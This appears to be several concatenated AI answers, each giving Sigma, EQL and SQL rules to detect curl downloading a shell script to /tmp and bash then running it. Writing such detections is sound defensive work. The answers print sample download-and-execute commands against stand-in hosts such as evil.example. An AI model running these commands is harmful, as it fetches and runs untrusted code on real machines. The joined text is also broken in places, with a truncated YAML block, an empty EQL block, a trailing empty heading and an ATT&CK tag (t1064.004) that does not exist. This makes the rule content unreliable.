text:
Below is a practical detection rule for the classic Linux/Unix download-and-execute pattern:

> `curl` downloads/writes a Bash script into `/tmp`, then `bash` executes a script under `/tmp`.

I’ll give both an **EQL sequence rule** and a **portable Sigma correlation rule**, because the exact rule language depends on your EDR/SIEM.

---

## 1. EQL Detection Rule

This rule works well in platforms such as Elastic, CrowdStrike/EDR-compatible rule sets, or other EQL-capable environments.

```eql
sequence with maxspan=30m
  [Process where process.name == "curl"
    and command_line =~ r"(?i)curl.*(?:-o\s*|--output(?:=|\s+)).*?/tmp/\S*\.sh"]
  by host

  followed by
  [Process where process.name == "bash"
    and command_line =~ r"(?i)\bbash\b.*\b/tmp/\S*\.sh"]
  by host
```

### Rule explanation

The first event detects `curl` commands that explicitly download or write a `.sh` script under `/tmp`, for example:

```bash
curl https://example.com/payload.sh -o /tmp/payload.sh
curl --output=/tmp/payload.sh https://example.com/payload.sh
curl -o /tmp/payload.sh https://example.com/payload.sh
```

The second event detects `bash` executing a `.sh` file under `/tmp`, for example:

```bash
bash /tmp/payload.sh
bash -c /tmp/payload.sh
```

The `maxspan=30m` window means the execution must occur within 30 minutes of the curl download event. You can tune this to 15m or 1h depending on your environment.

---

## 2. Portable Sigma Correlation Rule

This is useful if your platform supports Sigma correlation rules, especially for Linux/Sysmon or EDR process-creation telemetry.

```yaml
title: Malicious Curl Download of Bash Script to /tmp Followed by Bash Execution
id: 7c813d8f-6b4a-4d9f-b21a-3f6b6c5b8f12
status: experimental
description: >
  Detects a curl command downloading or writing a Bash script under /tmp,
  followed by bash executing a script under /tmp on the same host within
  30 minutes. This pattern is commonly associated with download-and-execute
  malware delivery.
references:
  - https://attack.mitre.org/techniques/T1059/004/
  - https://attack.mitre.org/techniques/T1105/
tags:
  - attack.command_and_scripting_interpreter
  - attack.t1059.004
  - attack.ingress_tool_transfer
  - attack.t1105
logsource:
  product: linux
  service: sysmon
  category: process_creation
detection:
  curl_download_to_tmp_sh:
    Image|endswith:
      - /curl
    CommandLine|re: '(?i)\bcurl\b.*(?:-o\s*|--output(?:=|\s+)).*?/tmp/\S*\.sh\b'

  bash_execute_tmp_sh:
    Image|endswith:
      - /bash
    CommandLine|re: '(?i)\bbash\b.*\b/tmp/\S*\.sh\b'

  condition: curl_download_to_tmp_sh or bash_execute_tmp_sh

correlation:
  type: temporal
  rules:
    - curl_download_to_tmp_sh
    - bash_execute_tmp_sh
  group-by:
    - host
  timespan: 30m

falsepositives:
  - Legitimate deployment scripts that download helper Bash scripts into /tmp
  - Package managers or installer scripts
  - CI/CD runners or automation frameworks
  - Administrative scripts using /tmp as temporary working storage
level: high
```

### Notes on field names

Depending on your telemetry source, you may need to adjust:

| Concept | Sysmon Linux | Common EDR/ECS fields |
|---|---|---|
| Host identifier | `Computer` | `host.name`, `host.id` |
| Process image | `Image` | `process.executable` |
| Process name | basename of `Image` | `process.name` |
| Command line | `CommandLine` | `process.command_line` |

For Sysmon, if your host field is called `Computer`, change the correlation group-by to:

```yaml
group-by:
  - Computer
```

---

## 3. Optional: Inline `curl && bash` Command Detection

Many malware samples run commands like:

```bash
bash -c 'curl https://example.com/payload.sh -o /tmp/payload.sh && bash /tmp/payload.sh'
```

A single-event rule can catch this directly:

```yaml
title: Inline Curl Download and Bash Execution of /tmp Script
id: 9b9f6a1c-1627-4e10-bc5e-4f1c817b7b11
status: experimental
description: >
  Detects a single command line that both downloads or writes a Bash script
  to /tmp using curl and then executes that script using bash.
references:
  - https://attack.mitre.org/techniques/T1059/004/
  - https://attack.mitre.org/techniques/T1105/
tags:
  - attack.command_and_scripting_interpreter
  - attack.t1059.004
  - attack.ingress_tool_transfer
  - attack.t1105
logsource:
  product: linux
  service: sysmon
  category: process_creation
detection:
  selection:
    Image|endswith:
      - /bash
      - /sh
    CommandLine|re: '(?i)\bcurl\b.*(?:-o\s*|--output).*?/tmp/\S*\.sh\b.*\bbash\b.*?/tmp/\S*\.sh\b'
  condition: selection
falsepositives:
  - Legitimate automation scripts chaining curl and bash
level: medium
```

For EQL:

```eql
[Process where command_line =~ r"(?i)curl.*(?:-o\s*|--output).*?/tmp/\S*\.sh.*\bbash\b.*?/tmp/\S*\.sh"]
by host
```

---

## 4. Recommended Enhancement: Use File Creation Events

A limitation of the command-line-only approach is that `curl` may write the file using:

```bash
curl https://example.com/payload.sh -O
```

or through shell redirection:

```bash
curl https://example.com/payload.sh > /tmp/payload.sh
```

In those cases, the output path may not appear directly in the `curl` process command line.

If you have file-creation telemetry, this makes the detection much stronger.

### Sysmon Linux file creation rule

```yaml
title: Curl Creates Bash Script in /tmp
id: 7e5d9c0d-9d1e-4d16-9a7a-3a83b83b9e71
status: experimental
description: >
  Detects curl creating or writing Bash script files under /tmp.
logsource:
  product: linux
  service: sysmon
  category: file_creation
detection:
  selection:
    EventID: 11
    Image|endswith:
      - /curl
    TargetFilename|re: '^/tmp/\S*\.sh$'
  condition: selection
falsepositives:
  - Legitimate download scripts
level: medium
```

Then correlate that event with the existing bash execution rule:

```yaml
correlation:
  type: temporal
  rules:
    - 7e5d9c0d-9d1e-4d16-9a7a-3a83b83b9e71
    - 7c813d8f-6b4a-4d9f-b21a-3f6b6c5b8f12
  group-by:
    - host
  timespan: 30m
```

Or in EQL, if file creation events are available:

```eql
sequence with maxspan=30m
  [File where process.name == "curl"
    and file.path =~ r"/tmp/\S*\.sh"]
  by host

  followed by
  [Process where process.name == "bash"
    and command_line =~ r"/tmp/\S*\.sh"]
  by host
```

If your platform supports correlating by the file path itself, use that to reduce unrelated correlations between different scripts.

---

## 5. Suggested Allowlisting / Tuning

Before promoting this to production, baseline your environment. Common legitimate examples that may cause false positives include:

```bash
curl https://releases.example.com/setup.sh -o /tmp/setup.sh && bash /tmp/setup.sh
```

This may be used by installers or patch management tools. You can suppress benign automation by filtering known parent processes, signed binaries, deployment directories, or package managers.

Examples of benign parent processes or commands to consider allowlisting:

- `/usr/bin/apt`
- `/usr/bin/dnf`
- `/usr/bin/yum`
- `/usr/bin/zypper`
- `/usr/bin/snap`
- `/usr/bin/flatpak`
- deployment tools such as Ansible, Puppet, Chef, Salt, GitLab Runner, Jenkins agents, Kubernetes node setup scripts, or custom patch-management agents.

Be careful with broad allowlists, because some malware legitimately abuses package managers and deployment automation.

---

## 6. Test Commands

These are safe validation commands for testing the rule.

### Split download and execute

```bash
curl https://example.com/payload.sh -o /tmp/test_payload.sh
bash /tmp/test_payload.sh
```

### Inline command

```bash
bash -c 'curl https://example.com/payload.sh -o /tmp/test_payload_inline.sh && bash /tmp/test_payload_inline.sh'
```

---

## Final Recommendation

For best coverage, deploy the rule in two parts:

1. **Process-based temporal correlation**
   - `curl` writes/downloads `/tmp/*.sh`
   - `bash` executes `/tmp/*.sh`

2. **File-creation correlation**
   - `curl` creates `/tmp/*.sh`
   - `bash` executes `/tmp/*.sh`

This covers both explicit `-o /tmp/script.sh` usage and indirect downloads where the filename may not appear directly in the `curl` command line.

text:
Below is a detection rule set for monitoring the classic Linux malware pattern:

```text
curl downloads a bash script to /tmp
then
bash or sh executes that script from /tmp
```

The rule assumes Linux endpoint telemetry, such as Sysmon for Linux or an EDR process-creation event source, where process image paths and command lines are available.

---

## 1. Sigma Detection Rule: Curl Downloads Bash Script to `/tmp`

```yaml
title: Curl Downloads Bash Script To /tmp
id: 11111111-1111-5111-8111-111111111111
status: experimental
description: >
  Detects curl downloading or writing bash scripts to /tmp. This is a common
  staging behavior for download-and-execute malware.
author: security-engineer
date: 2026-06-11
references:
  - https://attack.mitre.org/techniques/T1105/
  - https://attack.mitre.org/techniques/T1059/004/
tags:
  - attack.execution
  - attack.command_and_control
  - attack.resource-development
logsource:
  product: linux
  service: process_creation
detection:
  selection:
    Image|endswith:
      - '/curl'
    CommandLine|contains|all:
      - '/tmp'
      - '.sh'
  condition: selection
falsepositives:
  - Legitimate software installers that stage temporary bash scripts
  - Update scripts, provisioning scripts, or build automation using curl and /tmp
level: medium
```

---

## 2. Sigma Detection Rule: Bash Executes Script From `/tmp`

```yaml
title: Bash Executes Script From /tmp
id: 22222222-2222-5222-8222-222222222222
status: experimental
description: >
  Detects bash or sh executing a bash script from /tmp, which may indicate
  execution of a downloaded or staged payload.
author: security-engineer
date: 2026-06-11
references:
  - https://attack.mitre.org/techniques/T1059/004/
tags:
  - attack.execution
  - attack.command_and_control
logsource:
  product: linux
  service: process_creation
detection:
  selection:
    Image|endswith:
      - '/bash'
      - '/sh'
    CommandLine|contains|all:
      - '/tmp'
      - '.sh'
  condition: selection
falsepositives:
  - Administrator-run temporary scripts
  - CI/CD runners or deployment tools
  - Software installers using /tmp to stage scripts
level: medium
```

---

## 3. Sigma Correlation Rule: Curl Followed by Bash Execution From `/tmp`

```yaml
title: Curl Downloads Bash Script To /tmp Followed By Bash Execution
id: 33333333-3333-5333-8333-333333333333
status: experimental
description: >
  Detects a curl process that downloads or stages a bash script in /tmp,
  followed by bash or sh executing a bash script from /tmp. This correlates
  classic download-and-execute malware delivery patterns.
author: security-engineer
date: 2026-06-11
references:
  - https://attack.mitre.org/techniques/T1105/
  - https://attack.mitre.org/techniques/T1059/004/

  - attack.command_and_control
  - attack.resource-development
logsource:
  product: linux
  service: process_creation
detection:
  correlation:
    type: temporal
    rules:
      - 11111111-1111-5111-8111-111111111111
      - 22222222-2222-5222-8222-222222222222
    timespan: 5m
    group_by:
      - Host
      - User
level: high
```

---

## SIEM-Agnostic Sequence Logic

If you are not using Sigma directly, the equivalent sequence rule is:

```text
Sequence name:
  Malicious Download and Execute - Curl To Bash /tmp Script

Step 1:
  Event:
    Process Creation
  Conditions:
    process.name = "curl"
    process.command_line contains "/tmp"
    process.command_line contains ".sh"

Step 2:
  Event:
    Process Creation
  Conditions:
    process.name is one of:
      "bash"
      "sh"
      "/bin/bash"
      "/usr/bin/bash"
      "/bin/sh"
      "/usr/bin/sh"
    process.command_line contains "/tmp"
    process.command_line contains ".sh"

Relationship:
  Step 1 followed by Step 2

Window:
  5 minutes

Group by:
  Host
  User
```

Example command patterns that would be detected:

```bash
curl http://malicious.example/payload.sh -o /tmp/payload.sh
bash /tmp/payload.sh
```

```bash
curl https://example.com/mal.sh --output /tmp/mal.sh
sh /tmp/mal.sh
```

```bash
curl -o /tmp/x.sh https://evil.example/x.sh
/bin/bash /tmp/x.sh
```

---

## Optional Tuning: Detect Direct Parent-Child Execution

If you want to reduce false positives by checking that the `bash` process is a child of the same shell or parent process that invoked `curl`, use this variant:

```yaml
title: Curl To /tmp Script Executed By Child Bash Process

```bash
bash -c "curl -o /tmp/mal.sh https://evil.example/mal.sh && bash /tmp/mal.sh"

```

## Optional Tuning: Exact Script Path Correlation

The basic sequence rule above may generate alerts when two unrelated `/tmp` bash scripts are executed within the same time window. To improve fidelity, extract and correlate the exact script path.

Example extraction regex:

```regex
(/tmp/[^\s]+\.sh)
```

Conceptual correlation logic:

```text
Step 1:
  curl process command line contains /tmp/<script>.sh

Step 2:
  bash or sh process command line contains the same /tmp/<script>.sh

Group by:
  Host
  User
  extracted_script_path
```

Example derived field logic:

```text
script_path:
  regex: "(/tmp/[^\\s]+\\.sh)"
  source_field: command_line
```

Correlation:

```text
group_by: Host, User, script_path
```

This is stricter and can substantially reduce false positives, but it requires your SIEM, EQL, SPL, KQL, or correlation engine to support derived fields or regex extraction.

---

## Recommended Rule Tuning

Start with:

```text
level: high
timespan: 5m
group_by: Host, User
```

Then tune using:

- Exclude known installers, update tools, CI/CD agents, Docker, Kubernetes, Ansible, Chef, Puppet, or package-manager helper scripts.
- Add path exclusions only for known trusted binaries and command lines.
- If exact script-path correlation is available, use it to reduce noisy sequence matches.
- Watch for variations where the downloaded script is executed directly instead of through `bash`, for example:

```bash
chmod +x /tmp/mal.sh
/tmp/mal.sh
```

A slightly broader variant can include direct execution from `/tmp`:

```yaml
selection_execution:
  CommandLine|contains|all:
    - '/tmp'
    - '.sh'
```

But note that this will increase noise unless combined with exact path correlation and exclusions.

text:
Below is a practical way to write this detection as a correlation/sequence rule: first detect **`curl` downloading a `.sh` script into `/tmp`**, then detect **`bash` executing a `.sh` script from `/tmp`** on the same host within a short time window.

I would recommend using **Sigma** as the portable format, plus a generic correlation/query example if your platform does not support Sigma correlation rules.

---

## 1. Sigma rule set: `curl` download to `/tmp/*.sh` followed by `bash /tmp/*.sh`

This assumes Linux process-creation events, e.g. Sysmon for Linux, auditd/eBPF, or an EDR normalizing them to process-start events.

### Rule 1: `curl` downloads a bash script to `/tmp`

```yaml
title: Curl Downloads Bash Script To /tmp
id: 632d1867-e6c5-491f-9e2f-1f3a31f0d871
status: experimental
description: >
  Detects curl writing a script with a .sh extension into /tmp using -o or
  --output. This is the download/staging part of a classic curl-to-bash /
  download-and-execute pattern.
references:
  - https://attack.mitre.org/techniques/T1105/
logsource:
  product: linux
  service: sysmon
  category: process_creation
detection:
  curl_process:
    Image|endswith:
      - '/curl'
      - 'curl'

  curl_output_regex:
    CommandLine|re: '(?:-o\s+|--output\s*=?\s*)/tmp/[^\s]+\.sh\b'

  curl_output_nospace:
    CommandLine|contains|all:
      - '-o/tmp/'
      - '.sh'

  curl_output_long_equals:
    CommandLine|contains|all:
      - '--output=/tmp/'
      - '.sh'

  curl_output_long_space:
    CommandLine|contains|all:
      - '--output '
      - '/tmp/'
      - '.sh'

  condition: curl_process and (
    curl_output_regex or
    curl_output_nospace or
    curl_output_long_equals or
    curl_output_long_space
  )
fields:
  - Computer
  - Image
  - CommandLine
  - ParentImage
  - ParentCommandLine
falsepositives:
  - Legitimate administrative scripts or installers that place shell scripts in /tmp
  - CI/CD runners, update managers, and provisioning tools
level: high
tags:
  - attack.command_and_control
  - attack.t1105
  - attack.t1059.004
  - attack.t1064.004
```

---

### Rule 2: `bash` executes a script from `/tmp`

```yaml
title: Bash Executes Script From /tmp
id: 8f68347e-1c89-4323-8936-81a83d8962d6
status: experimental
description: >
  Detects bash executing a script located under /tmp. This can represent the
  execution stage of a download-and-execute malware workflow.
references:
  - https://attack.mitre.org/techniques/T1059/004/
logsource:
  product: linux
  service: sysmon
  category: process_creation
detection:
  bash_process:
    Image|endswith:
      - '/bash'
      - 'bash'

  tmp_sh:
    CommandLine|contains|all:
      - '/tmp/'
      - '.sh'

  tmp_sh_regex:
    CommandLine|re: '(?:^|\s)/tmp/[^\s]+\.sh\b'

  condition: bash_process and (tmp_sh or tmp_sh_regex)
fields:
  - Computer
  - Image
  - CommandLine
  - ParentImage
  - ParentCommandLine
falsepositives:
  - Legitimate maintenance scripts
  - Temporary deployment or patching scripts
level: high
tags:
  - attack.execution
  - attack.t1059.004
  - attack.t1064.004
```

---

### Correlation rule: download followed by execution

```yaml
title: Curl Download Followed By Bash Execution Of /tmp Script
id: 9d12f3c4-f4f9-4533-8157-197923d7d5e9
status: experimental
description: >
  Detects a curl process downloading a .sh script into /tmp followed by a bash
  process executing a .sh script from /tmp on the same host within 5 minutes.
  This correlates to classic malware delivery patterns using download-and-execute.
references:
  - https://attack.mitre.org/techniques/T1105/
  - https://attack.mitre.org/techniques/T1059/004/
category: correlation
correlation:
  type: temporal
  rules:
    - 632d1867-e6c5-491f-9e2f-1f3a31f0d871
    - 8f68347e-1c89-4323-8936-81a83d8962d6
  group_by:
    - Computer
  timespan: 5m
  condition: all
```

> If your telemetry uses `HostName`, `host.name`, `device.name`, or another host field, replace `Computer` in the `group_by` section.

---

## 2. Generic correlation logic

If you are building this directly in a SIEM/EDR correlation engine, the logic can be expressed as:

```text
EVENT 1:
  Process name / executable = curl
  AND
  Command line contains:
    -o /tmp/<something>.sh
    --output /tmp/<something>.sh
    --output=/tmp/<something>.sh
    -o/tmp/<something>.sh

EVENT 2:
  Process name / executable = bash
  AND
  Command line contains:
    /tmp/<something>.sh
    source /tmp/<something>.sh
    bash -c "... /tmp/<something>.sh ..."

CORRELATION:
  Same host
  EVENT 2 timestamp occurs after EVENT 1 timestamp
  Time difference <= 300 seconds
```

A higher-fidelity version can extract the downloaded `/tmp/*.sh` filename from the `curl` command and require the same filename in the later `bash` command.

---

## 3. Example EQL-style sequence rule for Elastic

For Elastic/EQL, the same idea can be represented as a sequence. Field names may need adjustment depending on your ingestion pipeline.

```eql
sequence by host.id with maxspan=5m
  [process where event.type == "start"
    and event.action == "exec"
    and (process.name == "curl" or process.name like "*\/curl")
    and (
      process.command_line like "* -o /tmp/*.sh*"
      or process.command_line like "*--output /tmp/*.sh*"
      or process.command_line like "*--output=/tmp/*.sh*"
      or process.command_line like "*-o/tmp/*.sh*"
    )
  ]
  [process where event.type == "start"
    and event.action == "exec"
    and (process.name == "bash" or process.name like "*\/bash")
    and (
      process.command_line like "bash /tmp/*.sh*"
      or process.command_line like "bash -c * /tmp/*.sh*"
      or process.command_line like "*source /tmp/*.sh*"
      or process.command_line like "* /tmp/*.sh*"
    )
  ]
```

---

## Tuning recommendations

1. **Start with a 5-minute window**  
   A 300-second window is usually reasonable. Adjust to 1 minute or 15 minutes depending on environment noise.

2. **Group by host, not process ID**  
   The download and execution may be performed by different processes, so grouping by `PID` may miss the relationship. Group by the host field.

3. **Reduce false positives with filename matching**  
   If your correlation engine supports extraction, pull the `/tmp/...sh` path from both commands and require the same file path:

   ```text
   curl: -o /tmp/update.sh
   bash: /tmp/update.sh
   ```

4. **Add parent-process context**  
   If possible, include `ParentImage`, `ParentCommandLine`, `ProcessGuid`, or `ProcessID` to help analysts see the full process tree.

5. **Watch command-line obfuscation**  
   Malware may use:
   ```bash
   curl --output /tmp/x.sh http://evil.example/payload
   chmod +x /tmp/x.sh
   /bin/bash /tmp/x.sh
   ```
   or:
   ```bash
   curl http://evil.example/payload -o /tmp/x.sh
   bash /tmp/x.sh
   ```
   The rules above should capture the common versions.

6. **Consider companion detections**  
   Malicious download-and-execute may also involve:
   - `wget`
   - `python -m urllib`
   - `bash -c 'curl ... | bash'`
   - file writes to `/tmp` followed by execution
   - suspicious outbound HTTP/TLS connections

---

## Suggested alert message fields

When this correlation fires, include:

```text
Hostname
Curl Process ID
Curl Command Line
Bash Process ID
Bash Command Line
Curl Event Timestamp
Bash Event Timestamp
Time Difference
Parent Process Command Lines
```

This gives an analyst enough context to quickly determine whether this is benign script deployment or malicious download-and-execute behavior.

## Detection Rule: `curl` Downloads Bash Script to `/tmp`, Followed by `bash` Execution

**Rule name:** `curl Downloads Bash Script to /tmp Followed by bash Execution`  
**Detection type:** Temporal sequence / multi-event correlation  
**Severity:** High  
**Platform:** Linux endpoints  
**MITRE ATT&CK:**
- `T1105` — Ingress Tool Transfer
- `T1059.004` — Command and Scripting Interpreter: Unix Shell

### Core detection logic

Alert when:

1. A `curl` process downloads or stages a Bash script into `/tmp`, and  
2. A `bash` process executes that script from `/tmp`,  
3. Both events occur on the same host within a short time window, preferably 5 minutes or less.  
4. For higher fidelity, require that the executed `/tmp/*.sh` filename matches the downloaded/staged `/tmp/*.sh` filename.

This detects the common pattern:

```bash
curl http://malicious.example/payload.sh -o /tmp/payload.sh
bash /tmp/payload.sh
```

---

## Recommended high-fidelity sequence rule

Use this if your endpoint source emits both **process creation** and **file creation/write** events.

### Event 1 — `curl` writes a `.sh` file into `/tmp`

```yaml
title: curl Writes Bash Script to /tmp
id: 6b9a7c91-32f8-4d7f-8f4d-2f86d2a2d4f3
status: experimental
description: >
  Detects a curl process writing or creating a Bash script under /tmp.
  This event is intended to be correlated with a subsequent bash execution event.
logsource:
  product: linux
  category: file_event
detection:
  selection:
    Image|endswith: '/curl'
    TargetFilename|startswith: '/tmp/'
    TargetFilename|endswith: '.sh'
  condition: selection
fields:
  - host.name
  - user.name
  - process.name
  - file.path
  - file.name
falsepositives:
  - Legitimate installers or update tools that stage shell scripts in /tmp
  - Administrators using curl to download scripts into /tmp for manual execution
level: medium
tags:
  - attack.command_and_control
  - attack.t1105
```

### Event 2 — `bash` executes a script from `/tmp`

```yaml
title: bash Executes Script from /tmp
id: 7c3e7b6c-6f8a-4739-8430-1d5539a339f2
status: experimental
description: >
  Detects bash directly executing a .sh file stored under /tmp.
  This event is intended to be correlated with a preceding curl file-write event.
logsource:
  product: linux
  category: process_creation
detection:
  selection:
    Image|endswith: '/bash'
    CommandLine|re: "(?:^|\\s)(?:[\\w/.-]*\\/)?bash\\b(?:\\s+-{1,2}[a-zA-Z]+)*\\s+/tmp/[^\\s]+\\.sh(?:\\s+|$)"
  condition: selection
fields:
  - host.name
  - user.name
  - process.name
  - process.command_line
falsepositives:
  - Legitimate temporary scripts executed from /tmp
  - Some installers or CI/CD agents staging scripts in /tmp before execution
level: medium
tags:
  - attack.execution
  - attack.t1059.004
```

### Correlation rule

```text
Rule A: curl Writes Bash Script to /tmp
Rule B: bash Executes Script from /tmp

Alert when:
  Rule A occurs before Rule B
  and both occur on the same host
  and the time difference is <= 5 minutes
  and preferably the /tmp/*.sh filename extracted from both events matches
```

---

## Sigma process-only fallback rule

If file events are not available, you can use process command lines. This is easier to deploy but has more gaps and false positives.

```yaml
title: curl Downloads Bash Script to /tmp Followed by bash Execution
id: 9d44f6d9-7c9a-4d5d-971b-942e4f1737c9
status: experimental
description: >
  Multi-event detection for a curl process downloading or writing a Bash script
  into /tmp, followed by bash executing that script. This rule assumes your SIEM
  or correlation engine supports timeframe-based multi-event matching.
logsource:
  product: linux
  category: process_creation
detection:
  curl_download:
    Image|endswith: '/curl'
    CommandLine|re: "(?:-o|--output)(?:=|\\s*)/tmp/[^\\s]+\\.sh"

  bash_execution:
    Image|endswith: '/bash'
    CommandLine|re: "(?:^|\\s)(?:[\\w/.-]*\\/)?bash\\b(?:\\s+-{1,2}[a-zA-Z]+)*\\s+/tmp/[^\\s]+\\.sh(?:\\s+|$)"

  condition: curl_download and bash_execution
  timeframe: 5m

fields:
  - host.name
  - user.name
  - process.name
  - process.command_line

falsepositives:
  - Legitimate software installers using /tmp staging scripts
  - Administrative tools downloading scripts to /tmp before execution
  - CI/CD jobs using temporary script locations

level: high
tags:
  - attack.command_and_control
  - attack.execution
  - attack.t1105
  - attack.t1059.004
```

> **Note:** If your Sigma processor does not support `timeframe` for multi-event detection, split this into the two standalone rules shown above and configure the sequence/correlation in your SIEM.

---

## Elastic EQL sequence rule

Recommended if using Elastic Endpoint, Elastic Defend, or ECS-formatted logs.

### High-fidelity version using file events

```eql

## Optional SQL-style correlation logic

For exact filename matching, use this general correlation pattern if your SIEM supports event enrichment and joins.

```sql
WITH curl_write AS (
  SELECT
    host.name,
    event_timestamp,
    regexp_extract(process.command_line, '(/tmp/[^\\s"]+\\.sh)') AS script_path
  FROM endpoint_logs
  WHERE process.name = 'curl'
    AND process.command_line RLIKE '(?:-o|--output)(?:=|\\s*)/tmp/[^\\s]+\\.sh'
),
bash_exec AS (
  SELECT
    host.name,
    event_timestamp,
    regexp_extract(process.command_line, '(/tmp/[^\\s"]+\\.sh)') AS script_path
  FROM endpoint_logs
  WHERE process.name = 'bash'
    AND process.command_line RLIKE '\\s+/tmp/[^\\s]+\\.sh(?:\\s+|$)'
)
SELECT
  curl_write.host.name,
  curl_write.script_path,
  curl_write.event_timestamp AS curl_timestamp,
  bash_exec.event_timestamp AS bash_timestamp
FROM curl_write
JOIN bash_exec
  ON curl_write.host.name = bash_exec.host.name
  AND curl_write.script_path = bash_exec.script_path
WHERE bash_exec.event_timestamp >= curl_write.event_timestamp
  AND bash_exec.event_timestamp <= curl_write.event_timestamp + INTERVAL 5 MINUTE;
```

## Tuning guidance

### Reduce false positives

Consider allowlisting the following only after validation:

- Known trusted installers that stage scripts in `/tmp`
- Patch management tools
- CI/CD runners
- Host-specific administrative tasks where `bash /tmp/*.sh` is normal
- Script locations that are not attacker-controlled, such as known package-manager temp paths, if observed legitimately

Examples of benign patterns:

```bash
curl https://trusted-installer.example.com/setup.sh -o /tmp/setup.sh
bash /tmp/setup.sh
```

```bash
curl -o /tmp/update.sh https://updates.example.com/update.sh
bash /tmp/update.sh
```

If you want to suppress some of these, allowlist by:

- Trusted domain or URL
- Host group
- Service account
- Parent process chain
- File hash
- Script signature or publisher, if available

### Improve fidelity

For stronger detection, add these requirements where supported:

```text
curl file write target:
  /tmp/<filename>.sh

bash execution target:
  /tmp/<same filename>.sh

Correlation constraints:
  same host.name
  same file path/filename
  same user.name when appropriate
  time window <= 5 minutes
  parent process chain may include shell, cron, systemd timer, or command injection source
```

### Coverage limitations

The command-line-only rule may miss cases such as:

```bash
cd /tmp
curl https://malicious.example.com/script.sh -o script.sh
bash script.sh
```

```bash
curl https://malicious.example.com/script.sh > /tmp/script.sh
bash /tmp/script.sh
```

```bash
curl https://malicious.example.com/script.sh --output-dir /tmp
bash /tmp/script.sh
```

These variants are best detected by monitoring **file writes created by curl** rather than relying only on curl command-line strings.

text:
## Detection Objective

Detect the classic Linux **download-and-execute** pattern where:

1. `curl` writes/downloads a bash script into `/tmp`, typically using `-o`, `--output`, or `--output-dir`.
2. A `bash` or `sh` process later executes a script located under `/tmp`.

MITRE mappings:

- `T1059.004` Command and Scripting Interpreter: Unix Shell
- `T1059` Command and Scripting Interpreter
- `T1105` Ingress Tool Transfer

---

## Primary Rule: Elastic EQL Sequence Rule

This rule uses a **sequence/correlation** because the malicious pattern spans two separate process creations.

```yaml
# EQL sequence detection:
# Curl downloads/downloads-to /tmp a bash script -> bash executes /tmp script
#
# Requires Linux process creation telemetry with fields such as:
# process.name, process.command_line, process.args, process.executable
#
// If your EQL version does not support multi-field grouping, change:
// sequence by host.id, user.id with maxspan=5m
// to:
// sequence by host.id with maxspan=5m

sequence by host.id, user.id with maxspan=5m

# Event 1:
# curl downloads/writes a script to /tmp
[process where event.type = "start"
  and host.platform = "linux"
  and process.name : "curl"
  and (
    # curl ... -o /tmp/file.sh
    (
      process.args : ("-o", "--output", "--output-dir", "-o=*/tmp/*.sh*", "-o=*/tmp/*.bash*", "--output=*/tmp/*.sh*", "--output=*/tmp/*.bash*")
      and process.args : ("*/tmp/*.sh*", "*/tmp/*.bash*")
    )
    or
    # curl ... --output=/tmp/file.sh
    # curl ... -o=/tmp/file.sh
    (
      process.command_line : (
        "* -o /tmp/*.sh*",
        "* -o /tmp/*.bash*",
        "* -o=/tmp/*.sh*",
        "* -o=/tmp/*.bash*",
        "* --output /tmp/*.sh*",
        "* --output /tmp/*.bash*",
        "* --output=/tmp/*.sh*",
        "* --output=/tmp/*.bash*",
        "* --output-dir /tmp/*",
        "* --output-dir=/tmp/*"
      )
    )
  )
]

# Event 2:
# bash/sh executes a script under /tmp
[process where event.type = "start"
  and host.platform = "linux"
  and (
    # bash /tmp/file.sh
    (
      process.name : ("bash", "sh")
      and process.args : ("*/tmp/*.sh*", "*/tmp/*.bash*")
    )
    or
    # /usr/bin/bash /tmp/file.sh
    (
      process.executable : ("*/bash", "*/sh")
      and process.args : ("*/tmp/*.sh*", "*/tmp/*.bash*")
    )
    or
    # env bash /tmp/file.sh, wrapper launching bash against /tmp script
    (
      process.command_line : ("*bash *", "*/bash*")
      and process.command_line : ("*/tmp/*.sh*", "*/tmp/*.bash*")
    )
    or
    # /tmp/file.sh executed directly, e.g. chmod +x /tmp/file.sh
    (
      process.executable : ("*/tmp/*.sh*", "*/tmp/*.bash*")
    )
  )
]
```

### Why this works

- The first event detects `curl` writing or downloading an artifact to `/tmp`.
- The second event detects `bash` or `sh` executing a `/tmp` script.
- The `sequence` clause correlates both events on the same host and user within 5 minutes.

### Notes and limitations

This rule detects patterns like:

```bash
curl http://evil.example/payload.sh -o /tmp/payload.sh
bash /tmp/payload.sh
```

It also helps with common variants:

```bash
curl http://evil.example/payload.sh --output /tmp/payload.sh
sh /tmp/payload.sh
```

It may miss:

```bash
curl http://evil.example/payload.sh > /tmp/payload.sh
```

because the redirect is handled by the parent shell, not by the `curl` process arguments. To catch redirect-based downloads, you need to monitor either:

- parent `bash` command lines containing `> /tmp/*.sh`, or
- file creation/write events under `/tmp`.

## Sigma Building Blocks

If your SIEM supports rule correlation rather than native EQL sequences, use these two Sigma rules and correlate them by `Host` and `User` within a short time window, such as 5 minutes.

### Sigma Rule 1: Curl Downloads Bash Script to /tmp

```yaml
title: Curl Downloading Bash Script to /tmp
description: Detects curl writing or downloading a bash script to /tmp using output-related command-line options.
status: experimental
author: Custom Detection
references:
  - https://attack.mitre.org/techniques/T1105/
  - https://attack.mitre.org/techniques/T1059/004/
tags:
  - attack.command_and_control
  - attack.t1105
  - attack.execution
  - attack.t1059.004

logsource:
  product: linux
  category: process_creation

detection:
  selection:
    Image|endswith:
      - '/curl'
    CommandLine|re: "(?i)(?:-o|--output|--output-dir)(?:=|\\s+)[^\\s;|&]*?/tmp/[^\\s;|&]*?\\.(?:sh|bash)(?:[\\s;|&]|$)"

  condition: selection

falsepositives:
  - Legitimate software installation scripts downloaded to /tmp
  - CI/CD pipelines downloading shell scripts
  - Admin maintenance scripts

level: medium
```

### Sigma Rule 2: Bash Executes Script From /tmp

```yaml
title: Bash Execution of /tmp Shell Script
description: Detects bash or sh executing a script located under /tmp.
status: experimental
author: Custom Detection
references:
  - https://attack.mitre.org/techniques/T1059/004/
  - https://attack.mitre.org/techniques/T1059/
tags:
  - attack.execution
  - attack.command_and_scripting_interpreter
  - attack.t1059.004

logsource:
  product: linux
  category: process_creation

detection:
  selection:
    Image|endswith:
      - '/bash'
      - '/sh'
    CommandLine|re: "(?i)(?:^|[\\s\"'])/tmp/[^\\s\"']*\\.(?:sh|bash)(?:[\\s\"']|$)"

  condition: selection

falsepositives:
  - Legitimate administrative scripts stored temporarily under /tmp
  - Software installers using /tmp staging directories
  - Container or CI/CD bootstrap scripts

level: medium
```

### Correlation Logic

In your SIEM, define a correlation rule similar to:

```text
Event 1: Curl Downloading Bash Script to /tmp
Event 2: Bash Execution of /tmp Shell Script

Group by:
  - Host
  - User

Time window:
  - 5 minutes
```

## Optional Single-Event Variant

